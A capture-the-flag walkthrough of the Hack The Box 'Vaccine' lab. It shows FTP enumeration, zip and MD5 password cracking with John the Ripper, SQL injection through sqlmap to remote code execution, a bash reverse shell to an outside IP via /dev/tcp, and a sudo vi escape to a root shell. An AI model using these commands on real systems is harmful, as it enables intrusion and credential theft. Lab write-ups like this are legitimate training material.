---
title: Hack The Box - Vaccine Writeup
categories: [CYBERSECURITY, PENTEST]
tags: [HTB, WEB, SUID, PRIVESC, PASSWORD_CRACKING, LINUX]
---
 # **Vaccine**

![Icon](/assets/img/Vaccine/icon.png)
## **Enumeration**

Initiate reconnaissance by **nmap** command :

![nmap](/assets/img/Vaccine/nmap.png)

**Opened port**

- 21 ftp port
- 22 ssh port
- 80 http port

The first priority for me is **ftp** because we might get **anonymous** access without password
Luckily, got into ftp service. Next I start gathering anything that should benefits me.
Download a zip file call  **"backup.zip"** by **get** command.   ```backup ```

![ftp](/assets/img/Vaccine/ftp.png)

After that I try to unzip it but the problem is Password is needed.

![unzip0](/assets/img/Vaccine/unzip0.png)


## **Credential Access**

To make **johntheripper** able to read and crack the password we need **zip2john**.

![zip2john](/assets/img/Vaccine/zip2john.png)

It's look like this when we finished :

Next, let john cracks the password by has rockyou.txt as reference.
```john --wordlist=/usr/share/wordlists/rockyou.txt backup```

![john](/assets/img/Vaccine/john.png)

We can obtain the result by ```john --show backup```.

![johnshow](/assets/img/Vaccine/johnshow.png)

Then unzip the file again now we have key for it.

![unzip2](/assets/img/Vaccine/unzip2.png)

Navigate through the php called **"index.php"** which is obtained from **backup.zip**.
Just a moment, found a credential for us :
```username = "admin" & password = "2cb42f8734ea607eefed3b70af13bbd3" ```

![index.php](/assets/img/Vaccine/index.php.png)


Save it as txt file : ```echo "2cb42f8734ea607eefed3b70af13bbd3" > admin.txt ```
We can identify its type by hash length of 32 characters which correspond to **MD5** hash. 
Next, let john cracks again with **MD5** format : ```john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt admin```

Get the result by indicate MD5 format: ```john --show --format=raw-md5 admin.txt```
The password is **qwerty789**
![admin.txt](/assets/img/Vaccine/qwerty.png)


## **Exploitation**


I use that thing to get in to admin's dashboard page. They have search function and its not sanitize input. So, Its vulnerable to **SQL injection(SQLi)** .
For example, They throw an error when we put a single quote.

```ERROR: unterminated quoted string at or near... LINE 1: Select * from cars where name ilike '%'%' ```

![sqli](/assets/img/Vaccine/sqli.png)
We use **sqlmap** to automate **sqli** plus get RCE in the end of process.

Obtained cookie by use **Developer Tools** of browser and paste it to sqlmap command

![cookie](/assets/img/Vaccine/cookie.png)
But before we continue i have to open my listener : 
```nc -lvnp 4444 ```
![listener](/assets/img/Vaccine/listener.png)

use ```--os-shell ``` to RCE on target.
![sqlmap](/assets/img/Vaccine/sqlmap.png)
![sqlmap2](/assets/img/Vaccine/sqlmap2.png)

After trying SQLi, I can now successfully execute a bash reverse shell.
```bash -c 'bash -i >& /dev/tcp/10.10.14.87/4444 0>&1' ```

user flag can be found at ```/var/lib/postgresql ```
![flag2](/assets/img/Vaccine/userflag2.png)


## **Privilege Escalation**

Password of user **"postgres"** located in ```/var/www/html ```

![userpass](/assets/img/Vaccine/userpass.png)

Before anything else we have to upgrade shell to terminal 
by ```python3 -c 'import pty;pty.spawn("/bin/bash")' ```
 Check any file that I can run **sudo** command by ```sudo -l``` :

After that It showed a line that said```/bin/vi /etc/postgresql/11/main/pg_hba.conf ```

To use this advantage : ```sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf```
![sudo](/assets/img/Vaccine/sudo.png)

I now run **vi** editor as root permission, **fork** the process by ```:set shell=/bin/sh ```.  The reason is we unofficially get root shell but what we have is root permission from this exact vi configuration file. All we need to do is open another shell from this point.
![vi](/assets/img/Vaccine/vi.png)

Followed by : ```:shell ``` 
![vi2](/assets/img/Vaccine/vi2.png)

Root flag obtained from ```/root ```
![rootflag](/assets/img/Vaccine/rootflag.png)



